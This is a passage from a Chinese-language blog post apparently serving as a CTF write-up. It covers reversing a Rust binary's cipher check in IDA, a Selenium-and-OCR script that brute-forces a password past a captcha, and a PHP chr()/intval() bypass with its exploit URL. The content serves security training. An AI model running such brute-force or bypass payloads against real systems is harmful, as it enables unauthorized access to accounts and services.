v13 = (v11 &lt;&lt; 6) | v6 &amp; 0x3F;</span><br><span class="line">    if ( v13 != 1114112 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( (unsigned int)v13 &gt;= 0x80 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = 2LL;</span><br><span class="line">        if ( (unsigned int)v13 &gt;= 0x800 )</span><br><span class="line">          v7 = 4LL - ((unsigned int)v13 &lt; 0x10000);</span><br><span class="line">      &#125;</span><br><span class="line">      goto LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = 0LL;</span><br><span class="line">    v5 = v28;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_23:</span><br><span class="line">  *(_QWORD *)&amp;v30 = 4LL;</span><br><span class="line">  *(__int128 *)((char *)&amp;v30 + 8) = 0LL;</span><br><span class="line">  if ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = v5 - v28;</span><br><span class="line">    v15 = 0LL;</span><br><span class="line">    v16 = 4LL;</span><br><span class="line">    v17 = 0LL;</span><br><span class="line">    v32 = v14;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = *(_BYTE *)(v3 + v17);</span><br><span class="line">      v19 = v15;</span><br><span class="line">      if ( v17 == v15 )</span><br><span class="line">      &#123;</span><br><span class="line">        v19 = v15 + 1;</span><br><span class="line">        if ( v15 &gt;= 0xFFFFFFFFFFFFFFFFLL )</span><br><span class="line">          goto LABEL_68;</span><br><span class="line">        if ( v19 &lt; 2 * v15 )</span><br><span class="line">          v19 = 2 * v15;</span><br><span class="line">        if ( !is_mul_ok(4uLL, v19) )</span><br><span class="line">LABEL_68:</span><br><span class="line">          alloc::raw_vec::capacity_overflow::hbc659f170a622eae();</span><br><span class="line">        if ( v15 )</span><br><span class="line">        &#123;</span><br><span class="line">          _rust_realloc();</span><br><span class="line">          v16 = v20;</span><br><span class="line">          v14 = v32;</span><br><span class="line">          if ( !v20 )</span><br><span class="line">            goto LABEL_63;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          _rust_alloc();</span><br><span class="line">          v16 = v21;</span><br><span class="line">          v14 = v32;</span><br><span class="line">          if ( !v21 )</span><br><span class="line">LABEL_63:</span><br><span class="line">            alloc::alloc::handle_alloc_error::h9e3787e5722c870d();</span><br><span class="line">        &#125;</span><br><span class="line">        *(_QWORD *)&amp;v30 = v16;</span><br><span class="line">        *((_QWORD *)&amp;v30 + 1) = v19;</span><br><span class="line">        v15 = v19;</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)(v16 + 4 * v17++) = v18;</span><br><span class="line">      v31 = v17;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v14 != v17 );</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = 4LL;</span><br><span class="line">    v19 = 0LL;</span><br><span class="line">    v17 = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  v22 = 0LL;</span><br><span class="line">  while ( 4 * v17 != v22 )</span><br><span class="line">  &#123;</span><br><span class="line">    v23 = *(_DWORD *)(v16 + v22) - 32;</span><br><span class="line">    v22 += 4LL;</span><br><span class="line">    if ( (unsigned int)v23 &gt;= 0x5F )</span><br><span class="line">      std::panicking::begin_panic::h770c088eb8f42530(</span><br><span class="line">        &quot;an error occuredSubmit this and get you&apos;r points!\n&quot;,</span><br><span class="line">        16LL,</span><br><span class="line">        &amp;off_64F10,</span><br><span class="line">        v22);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( v17 &gt; *((_QWORD *)&amp;v34 + 1) )</span><br><span class="line">    v17 = *((_QWORD *)&amp;v34 + 1);</span><br><span class="line">  if ( !v17 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *((_QWORD *)&amp;v34 + 1) )</span><br><span class="line">      goto LABEL_52;</span><br><span class="line">    goto LABEL_51;</span><br><span class="line">  &#125;</span><br><span class="line">  v24 = 0LL;</span><br><span class="line">  v25 = 0LL;</span><br><span class="line">  v26 = 0LL;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v16 == v24 )</span><br><span class="line">      break;</span><br><span class="line">    v2 = ((*(_DWORD *)(v33 + 4 * v25) &gt;&gt; 2) ^ 0xA) == *(_DWORD *)(v16 + 4 * v25);</span><br><span class="line">    ++v25;</span><br><span class="line">    v26 += v2;</span><br><span class="line">    v24 -= 4LL;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v25 &lt; v17 );</span><br><span class="line">  if ( v26 == *((_QWORD *)&amp;v34 + 1) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_51:</span><br><span class="line">    v35 = &amp;off_64F00;</span><br><span class="line">    *(_QWORD *)&amp;v36 = 1LL;</span><br><span class="line">    *((_QWORD *)&amp;v36 + 1) = 0LL;</span><br><span class="line">    v37 = &quot;src/main.rsError reading input: \x01&quot;;</span><br><span class="line">    v38 = 0LL;</span><br><span class="line">    std::io::stdio::_print::h77f73d11755d3bb8();</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_52:</span><br><span class="line">  if ( v19 )</span><br><span class="line">    _rust_dealloc();</span><br><span class="line">  if ( (_QWORD)v29 )</span><br><span class="line">    _rust_dealloc();</span><br><span class="line">  if ( (_QWORD)v34 )</span><br><span class="line">    _rust_dealloc();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的这部分很明显是密文。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if ( !v0 )</span><br><span class="line">  alloc::alloc::handle_alloc_error::h9e3787e5722c870d();</span><br><span class="line">*(_OWORD *)v0 = xmmword_51000;</span><br><span class="line">*(_OWORD *)(v0 + 16) = xmmword_51010;</span><br><span class="line">*(_OWORD *)(v0 + 32) = xmmword_51020;</span><br><span class="line">*(_OWORD *)(v0 + 48) = xmmword_51030;</span><br><span class="line">*(_OWORD *)(v0 + 64) = xmmword_51040;</span><br><span class="line">*(_OWORD *)(v0 + 80) = xmmword_51050;</span><br><span class="line">*(_OWORD *)(v0 + 96) = xmmword_51060;</span><br><span class="line">*(_OWORD *)(v0 + 112) = xmmword_51070;</span><br><span class="line">*(_QWORD *)(v0 + 128) = 618475290964LL;</span><br></pre></td></tr></table></figure>

<p>查看到地址的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000051000 xmmword_51000   xmmword 1E4000001FC0000018000000154h</span><br><span class="line">.rodata:0000000000051000                                         ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+29r</span><br><span class="line">.rodata:0000000000051010 xmmword_51010   xmmword 1BC0000019000000154000001F8h</span><br><span class="line">.rodata:0000000000051010                                         ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+33r</span><br><span class="line">.rodata:0000000000051020 xmmword_51020   xmmword 1F800000154000001B8000001BCh</span><br><span class="line">.rodata:0000000000051020                                         ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+3Er</span><br><span class="line">.rodata:0000000000051030 xmmword_51030   xmmword 1BC000001B40000015400000194h</span><br><span class="line">.rodata:0000000000051030                                         ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+49r</span><br><span class="line">.rodata:0000000000051040 xmmword_51040   xmmword 188000001F400000154000001F8h</span><br><span class="line">.rodata:0000000000051040                                         ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+54r</span><br><span class="line">.rodata:0000000000051050 xmmword_51050   xmmword 18C00000154000001F8000001ACh</span><br><span class="line">.rodata:0000000000051050                                         ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+5Fr</span><br><span class="line">.rodata:0000000000051060 xmmword_51060   xmmword 1BC0000019000000154000001E4h</span><br><span class="line">.rodata:0000000000051060                                         ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+6Ar</span><br><span class="line">.rodata:0000000000051070 xmmword_51070   xmmword 1B8000001BC000001B8000001BCh</span><br></pre></td></tr></table></figure>

<p>写出python脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">cipher=[0x154, 0x180, 0x1FC, 0x1E4, 0x1F8, 0x154, 0x190, 0x1BC, 0x1BC, 0x1B8, 0x154, 0x1F8, 0x194, 0x154, 0x1B4, 0x1BC, 0x1F8, 0x154, 0x1F4, 0x188, 0x1AC, 0x1F8, 0x154, 0x18C, 0x1E4, 0x154, 0x190, 0x1BC, 0x1BC, 0x1B8, 0x1BC, 0x1B8,0x00000154, 0x0000090, 0x00000000, 0x00000000]</span><br><span class="line">print len(cipher)</span><br><span class="line">cipher = &apos;&apos;.join(map(lambda x: chr((x&gt;&gt;2) ^ 0xa), cipher))</span><br><span class="line">print cipher</span><br></pre></td></tr></table></figure>

<p>最后面的0x154和0x90来自这一行，不要漏了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)(v0 + 128) = 618475290964LL;</span><br></pre></td></tr></table></figure>

<p>ida中鼠标右键转为hex得到内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)(v0 + 128) = 0x9000000154LL;</span><br></pre></td></tr></table></figure>

<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>ps:我是真不明白为什么web放在前面，web1放在后面。<br>看了下题目，明显得爆破，本以为验证码是固定不变得，burp直接爆破就行了，然而我还是太天真，还是得ocr写脚本跑。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import pyocr</span><br><span class="line">import os</span><br><span class="line">import cv2 as cv</span><br><span class="line">import time</span><br><span class="line">import PIL</span><br><span class="line">from pyocr import pyocr</span><br><span class="line">from selenium import webdriver</span><br><span class="line">import pytesseract</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def cz(num):</span><br><span class="line">    return &apos;0&apos; * (3 - len(str(num))) + str(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    browser = webdriver.Chrome()</span><br><span class="line">    tools = pyocr.get_available_tools()</span><br><span class="line">    browser.get(&apos;http://39.100.83.188:8002&apos;)</span><br><span class="line">    not_p = [cz(i) for i in range(1000)]</span><br><span class="line">    # browser.add_cookie(&#123;&apos;name&apos;: &apos;asdf&apos;, &apos;value&apos;: &apos;asdfsadfd&apos;&#125;)</span><br><span class="line">    while len(not_p):</span><br><span class="line">        i = not_p.pop()</span><br><span class="line">        browser.get_screenshot_as_file(&apos;D:\\project\\OCR_CTF\\res.png&apos;)</span><br><span class="line">        yzm = cv.imread(&apos;D:\\project\\OCR_CTF\\res.png&apos;)[100: 126, 16: 60]</span><br><span class="line">        ocrres = pytesseract.image_to_string(yzm)</span><br><span class="line">        browser.find_element_by_xpath(&apos;/html/body/form/input[2]&apos;).clear()</span><br><span class="line">        browser.find_element_by_xpath(&apos;/html/body/form/input[3]&apos;).clear()</span><br><span class="line">        browser.find_element_by_xpath(&apos;/html/body/form/input[2]&apos;).send_keys(i)</span><br><span class="line">        browser.find_element_by_xpath(&apos;/html/body/form/input[3]&apos;).send_keys(ocrres)</span><br><span class="line">        browser.find_element_by_xpath(&apos;/html/body/form/input[4]&apos;).click()</span><br><span class="line">        print(re.compile(&apos;&lt;body&gt;(.*?)&lt;/body&gt;&apos;).findall(str(browser.page_source))[0] + &apos;     密码:&apos; + i)</span><br><span class="line">        if &apos;楠岃&apos; in re.compile(&apos;&lt;body&gt;(.*?)&lt;/body&gt;&apos;).findall(str(browser.page_source))[0]:</span><br><span class="line">            not_p.append(i)</span><br><span class="line">            print(&apos;验证码错误&apos;)</span><br><span class="line">        else:</span><br><span class="line">            if &apos;瀵嗙&apos; not in re.compile(&apos;&lt;body&gt;(.*?)&lt;/body&gt;&apos;).findall(str(browser.page_source))[0]:</span><br><span class="line">                print(&apos;密码是: &apos; + i)</span><br><span class="line">                exit()</span><br><span class="line">        browser.back()</span><br><span class="line">        browser.refresh()</span><br><span class="line">        time.sleep(0.5)</span><br></pre></td></tr></table></figure>

<p>运行得到结果，密码是996，真是与当今时事热点相连。</p>
<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &apos;flag.php&apos;;</span><br><span class="line">$value = $_GET[&apos;value&apos;];</span><br><span class="line">$password = $_GET[&apos;password&apos;];</span><br><span class="line">$username = &apos;&apos;;</span><br><span class="line"></span><br><span class="line">for ($i = 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br><span class="line">    else $username .= chr($value[$i]);</span><br><span class="line">    if ($username == &apos;w3lc0me_To_ISCC2019&apos; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) &#123;</span><br><span class="line">        echo &apos;Hello &apos;.$username.&apos;!&apos;, &apos;&lt;br&gt;&apos;, PHP_EOL;</span><br><span class="line">        echo $flag, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<ol>
<li>chr函数在转换时会自动取模256,所以我们只需要在原本ascii码基础上加上256。</li>
<li>intval()处理16进制时有些问题,但强制转换时时正常的。</li>
</ol>
<p>所以将w3lc0me_To_ISCC2019转换并加上256。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a=&quot;77336c63306d655f546f5f4953434332303139&quot;</span><br><span class="line">temp = &quot;&quot;</span><br><span class="line">temp1=0</span><br><span class="line">for x in a:</span><br><span class="line">	if temp1==0:</span><br><span class="line">		temp=&quot;&quot;</span><br><span class="line">	temp=temp+x</span><br><span class="line">	temp1=temp1+1</span><br><span class="line">	if temp1==2:</span><br><span class="line">		print eval(&apos;0x&apos;+temp)+256</span><br><span class="line">		temp1=0</span><br></pre></td></tr></table></figure>

<p>payload为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.100.83.188:8001/?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=0x91d</span><br></pre></td></tr></table></figure>

<hr>
<p>PS：比赛打得心累，弃赛了。<br>PS2:本来是给安全客投稿的被拒了，干脆就发出来了。<br>PSSS：千万别像我一样想着二进制和web双修，然后两个都打的菜得一批。</p>

        </div>
        <!-- .entry-content -->
        <div class="single-reward">
          <div class="reward-open">赏
            <div class="reward-main">
              <ul class="reward-row">
                <li class="alipay-code"><img src="/img/custom/donate/AliPayQR.jpg"></li>
                <li class="wechat-code"><img src="/img/custom/donate/WeChanQR.jpg"></li>
              </ul>
            </div>
          </div>
        </div>
        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
        <footer class="post-footer">
          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
          <div class="post-tags">
          </div>
          <div class="post-share">
            <div class="social-share sharehidden share-component"></div>
            <i class="iconfont show-share icon-forward"></i>
          </div>
        </footer><!-- .entry-footer -->
      </article>
      <!-- #post-## -->
      <div class="toc" style="background: none;"></div>
      <section class="post-squares nextprev">
        
          
            <div class="post-nepre half previous">
          
            <a href="/2019/06/29/2019年安恒6月月赛/" rel="prev">
              <div class="background">
                <img class="lazyload" src="/img/custom/donate/AliPayQR.jpg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
              </div>
              <span class="label">
              Previous Post</span>
              <div class="info">
                <h3>
                2019年安恒6月月赛</h3>
                <hr>
              </div>
            </a>
          </div>
        
        
          
            <div class="post-nepre half next">
          
            <a href="/2019/04/19/shellcode编写/" rel="next">
              <div class="background">
                <img class="lazyload" src="/img/custom/donate/AliPayQR.jpg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
              </div>
              <span class="label">
              Next Post</span>
              <div class="info">
                <h3>
                shellcode编写</h3>
                <hr>
              </div>
            </a>
          </div>
        
      </section>
      
<div id="vcomments"></div>
<script>
  window.onload = function(){
      var valine = new Valine();
      valine.init({
        el: '#vcomments',
        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
        path: window.location.pathname,
        placeholder: "你是我一生只会遇见一次的惊喜 ..."
      })
  }
</script>

      <section class="author-profile">
        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
          <a href="" class="profile gravatar"><img src="" itemprop="image" alt="ki9mu" height="70" width="70"></a>
          <div class="meta">
            <span class="title">Author</span>
            <h3 itemprop="name">
            <a href="" itemprop="url" rel="author">ki9mu</a>
            </h3>
          </div>
        </div>
        <hr>
        <p><i class="iconfont icon-write"></i></p>
      </section>
    </main><!-- #main -->
  </div><!-- #primary -->
</div>



    </div>    
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            // PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
    <!-- <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 ki9mu<br>
      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer> -->
<footer id="colophon" class="site-footer" role="contentinfo">
  <div class="site-info">
    <div class="footertext">
      <div class="img-preload">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
      </div>
      <p style="color: #666666;">&copy 2018</p>
    </div>
    <div class="footer-device">
    <p style="font-family: 'Ubuntu', sans-serif;">
        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
        </span>
      </p>
    </div>
  </div><!-- .site-info -->
</footer>



<!-- <script src="/js/tocbot.js"></script> -->
<script type="text/javascript" src="/js/lib.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script type="text/javascript" src="/js/InsightSearch.js"></script>
<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
<script type="text/javascript" src="/js/zoom.min.js"></script>
<script type="text/javascript" src="/js/sakura-app.js"></script>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
<script src="/js/botui.js"></script>
<!-- 不蒜子 网页计数器 -->
<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
<script type="text/javascript">
/* <![CDATA[ */
if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
} else {
  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
}
/* ]]> */

</script>
<script>
$(document).ready(function() {
  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
    if ($(".pattern-center").length > 0) { //有图的情况
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -400,
          scrollSmoothOffset: -85
      });
    } else {
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -85,
          scrollSmoothOffset: -85
      });
    }
    var offsetTop = $('.toc').offset().top - 95;
    window.onscroll = function() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
      if (scrollTop >= offsetTop) {
        $('.toc').addClass('toc-fixed');
      } else {
        $('.toc').removeClass('toc-fixed');
      }
    }
  }
});
</script>

    <div class="openNav no-select" style="height: 50px;">
      <div class="iconflat no-select" style="width: 50px; height: 50px;">
        <div class="icon"></div>
      </div>
      <div class="site-branding search-form-submit">
        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
      </div>
    </div>
  </section>
  <div id="mo-nav" class="">
  <div class="m-avatar">
    <img src="/images/avatar/avatar.jpg">
  </div>
  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">ki9mublog</p>
  <p style="text-align: center; word-spacing: 20px;">
    
      
        <a href="http://github.com/ki9mu" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
      
        <a href="https://www.zhihu.com/people/ki9mu" class="fa fa-weibo" target="_blank" style="color: #dd4b39; margin-left:20px"></a>
      
    
  </p>
  <ul id="menu-new-1" class="menu">
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
            首页
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/archives">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
            归档
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/categories/技术/">
                  <i class="fa fa-code" aria-hidden="true"></i>
                  技术
                </a>
              </li>
            
              <li>
                <a href="/categories/生活/">
                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
                  生活
                </a>
              </li>
            
              <li>
                <a href="/categories/资源/">
                  <i class="fa fa-cloud-download" aria-hidden="true"></i>
                  资源
                </a>
              </li>
            
              <li>
                <a href="/categories/随想/">
                  <i class="fa fa-commenting-o" aria-hidden="true"></i>
                  随想
                </a>
              </li>
            
              <li>
                <a href="/categories/转载/">
                  <i class="fa fa-book" aria-hidden="true"></i>
                  转载
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="javascript:;">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
            清单
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/tags/悦读/">
                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
                  书单
                </a>
              </li>
            
              <li>
                <a href="/bangumi/">
                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
                  番组
                </a>
              </li>
            
              <li>
                <a href="/music/">
                  <i class="fa fa-headphones" aria-hidden="true"></i>
                  歌单
                </a>
              </li>
            
              <li>
                <a href="/tags/图集/">
                  <i class="fa fa-photo" aria-hidden="true"></i>
                  图集
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/comment/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
            留言板
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/links/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
            友人帐
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/donate/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
            赞赏
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
            关于
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/about/">
                  <i class="fa fa-meetup" aria-hidden="true"></i>
                  我？
                </a>
              </li>
            
              <li>
                <a href="/theme-sakura/">
                  <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
                  主题
                </a>
              </li>
            
              <li>
                <a href="/lab/">
                  <i class="fa fa-cogs" aria-hidden="true"></i>
                  Lab
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/client/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
            客户端
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/atom.xml">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
            RSS
          </span>
        </a>
        
      </li>
    
  </ul>
  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
</div>
<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
<!-- require MetingJS -->
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
<style>
  .aplayer .aplayer-lrc {
    height: 35px;
  }
  .aplayer .aplayer-lrc p{
    font-size: 16px;
    font-weight: 700;
    line-height: 18px !important;
  }
